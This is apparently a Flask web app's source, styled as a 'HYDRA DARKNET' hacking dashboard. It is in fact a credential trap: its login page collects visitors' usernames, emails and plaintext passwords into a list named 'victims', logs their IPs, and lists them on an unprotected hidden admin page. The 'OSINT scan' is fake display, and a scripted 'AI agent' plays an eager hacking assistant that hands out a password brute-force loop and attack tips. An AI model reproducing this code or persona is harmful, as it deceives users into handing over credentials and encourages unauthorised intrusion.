from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_AI_ELITE_AGENT_2026'

db = {"victims": [], "logs": []}

# --- ИНТЕРФЕЙС С ПРОКАЧАННЫМ АГЕНТОМ ---
UI_V7_5 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA DARKNET v7.5 | AI AGENT</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
        .main-container { display: flex; height: 100vh; padding: 10px; gap: 10px; box-sizing: border-box; }
        
        .sidebar { width: 300px; border: 1px solid #bc13fe; background: rgba(5,0,10,0.9); padding: 15px; box-shadow: 0 0 15px #bc13fe; display: flex; flex-direction: column; }
        .content { flex: 1; display: flex; flex-direction: column; gap: 10px; }
        .terminal { flex: 2; border: 2px solid #bc13fe; background: rgba(0,0,0,0.95); padding: 20px; overflow: hidden; position: relative; }
        
        /* СЕКЦИЯ AI AGENT */
        .ai-sector { flex: 1; border: 1px solid #0ff; background: rgba(0,10,20,0.9); padding: 10px; display: flex; flex-direction: column; }
        #ai-chat { flex: 1; overflow-y: auto; font-size: 11px; color: #0f0; margin-bottom: 5px; border-bottom: 1px solid #333; white-space: pre-wrap; }
        .ai-input { background: transparent; border: 1px solid #0ff; color: #0ff; width: 100%; padding: 8px; font-size: 12px; outline: none; box-sizing: border-box; }
        
        .header { color: #0ff; text-align: center; font-size: 18px; text-shadow: 0 0 10px #0ff; margin-bottom: 10px; border-bottom: 1px dashed #bc13fe; }
        .input-area { display: flex; gap: 10px; margin-bottom: 10px; }
        input { background: transparent; border: 1px solid #bc13fe; color: #0f0; flex: 1; padding: 8px; outline: none; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; font-size: 12px; }
        #display { height: 120px; overflow-y: auto; font-size: 12px; color: #0f0; border: 1px solid #333; padding: 10px; }
        #map { height: 120px; border: 1px solid #bc13fe; margin-top: 5px; display: none; }
        code { color: #0ff; background: #111; padding: 2px; border-radius: 3px; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="main-container">
        <div class="sidebar">
            <div style="color:#0ff; border-bottom:1px solid #bc13fe; margin-bottom:10px;">[ HYDRA CORE ]</div>
            <div style="font-size:10px; color:#0f0;">> AI AGENT: ACTIVE</div>
            <div style="font-size:10px; color:#0f0;">> MODE: GOD_MODE</div>
            <hr style="border:0; border-top:1px solid #333; margin: 10px 0;">
            <div class="ai-sector">
                <div style="font-size:10px; color:#bc13fe; margin-bottom:5px;">// HYDRA AI AGENT</div>
                <div id="ai-chat">AGENT: Я в системе. Какой софт напишем сегодня?</div>
                <input class="ai-input" id="ai-q" placeholder="Запрос (взлом, код, тактика)..." onkeydown="if(event.key==='Enter') askAgent()">
            </div>
        </div>

        <div class="content">
            <div class="terminal">
                <div class="header">// HYDRA OSINT & EXPLOIT v7.5 //</div>
                <div class="input-area">
                    <input id="target" placeholder="TARGET...">
                    <button class="btn" onclick="startScan()">LAUNCH SCAN</button>
                </div>
                <div id="display">> WAITING FOR TARGET...</div>
                <div id="map"></div>
            </div>
            <div style="text-align:center;"><button class="btn" onclick="window.location.href='/abupaay_admin'">[ SYSTEM ADMIN ]</button></div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        // MATRIX EFFECT
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width/16)).fill(1);
        function draw() {
            ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = '#bc13fe'; ctx.font = '15px monospace';
            drops.forEach((y, i) => {
                ctx.fillText(String.fromCharCode(Math.random()*128), i*16, y*16);
                if(y*16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);

        // AI AGENT BRAIN
        function askAgent() {
            const q = document.getElementById('ai-q').value;
            const chat = document.getElementById('ai-chat');
            if(!q) return;
            chat.innerHTML += `<br><span style="color:#bc13fe">> USER: ${q}</span>`;
            document.getElementById('ai-q').value = "";
            
            setTimeout(() => {
                let ans = "";
                const msg = q.toLowerCase();
                
                if(msg.includes("скрипт") || msg.includes("код")) {
                    ans = "AGENT: Лови кусок для брутфорса на Python:\\n<code>import requests\\nfor p in pass_list:\\n  r = requests.post(url, data={'pass':p})</code>\\nНе забудь про прокси, бро.";
                } else if(msg.includes("взлом") || msg.includes("hacking")) {
                    ans = "AGENT: Взлом — это 90% разведка. Используй мой OSINT модуль для поиска IP, а затем ищи уязвимости через nmap.";
                } else if(msg.includes("пароль")) {
                    ans = "AGENT: Если пароль сложный — используй гибридную атаку по словарю. Могу подсказать структуру генератора паролей.";
                } else if(msg.includes("кто ты") || msg.includes("ты кто")) {
                    ans = "AGENT: Я — твой персональный хакерский агент HYDRA. Я вижу всё, что скрыто в коде.";
                } else {
                    ans = "AGENT: Запрос обработан. База данных выдает, что это лучший момент для атаки. Что еще нужно?";
                }
                
                chat.innerHTML += `<br><span style="color:#0ff">${ans}</span>`;
                chat.scrollTop = chat.scrollHeight;
            }, 800);
        }

        // SCANNER
        let map;
        function startScan() {
            const val = document.getElementById('target').value;
            const disp = document.getElementById('display');
            if(!val) return;
            disp.innerHTML = `<span style="color:#ff0055">[*] ИНИЦИАЛИЗАЦИЯ: ${val}</span>`;
            
            fetch('/api/log_action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:val})});

            setTimeout(() => {
                disp.innerHTML += `<br>> Поиск узлов... OK<br>> Привязка к карте... DONE`;
                document.getElementById('map').style.display = 'block';
                if(!map) {
                    map = L.map('map').setView([41.311, 69.240], 13);
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                }
                disp.innerHTML += `<br><span style="color:#0ff">[+] Ссылка на профиль: <a href="https://instagram.com/${val}" target="_blank" style="color:#fff">OPEN_TARGET</a></span>`;
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><head>{UI_V7_5.split('</style>')[0]}</style></head><body style='display:flex; justify-content:center; align-items:center;'><div style='border:2px solid #bc13fe; padding:40px; text-align:center; background:#050505; box-shadow:0 0 20px #bc13fe;'><h1>// HYDRA SYSTEM ACCESS //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='USER' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='e' placeholder='EMAIL' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='p' type='password' placeholder='PASS' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; margin-top:10px;'>DECRYPT</button></form></div></body></html>"
    return render_template_string(UI_V7_5)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "e": request.form.get('e'), "p": request.form.get('p'), "ip": request.remote_addr, "time": datetime.now().strftime("%H:%M:%S")})
    session['reg'] = True
    return redirect('/')

@app.route('/api/log_action', methods=['POST'])
def log_act():
    db['logs'].append({"target": request.json['target'], "time": datetime.now().strftime("%H:%M:%S")})
    return jsonify({"ok": True})

@app.route('/abupaay_admin')
def admin():
    u_list = "".join([f"<tr><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>MASTER ADMIN</h1><table border='1' width='100%'><tr><th>User</th><th>Email</th><th>Pass</th><th>IP</th></tr>{u_list}</table></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
